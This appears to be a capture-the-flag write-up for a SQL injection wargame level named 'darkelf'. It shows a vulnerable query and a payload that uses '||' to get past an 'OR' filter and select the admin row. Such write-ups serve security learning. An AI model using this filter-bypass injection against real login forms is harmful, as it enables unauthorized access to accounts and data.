---
custom_edit_url: null
sidebar_position: 6
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/6674ab0c-5e81-49b2-b7e4-62093ae1c3da)

We are provided with the SQL query:

```sql
SELECT id FROM prob_darkelf WHERE id='guest' AND pw='{$_GET[pw]}'
```

This level prints out the flag if the `id=admin`. 

However, it also removes the `OR` characters. In order to get around this, we need to use the double pipe (`||`) characters.

If we provide the following URI parameter:

```
?pw=' || id='admin
```

The resultant query becomes:

```sql
SELECT id FROM prob_darkelf WHERE id='guest' AND pw='' || id='admin'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/f912a7a1-a27a-4632-938b-1e6d6bcc56dc)
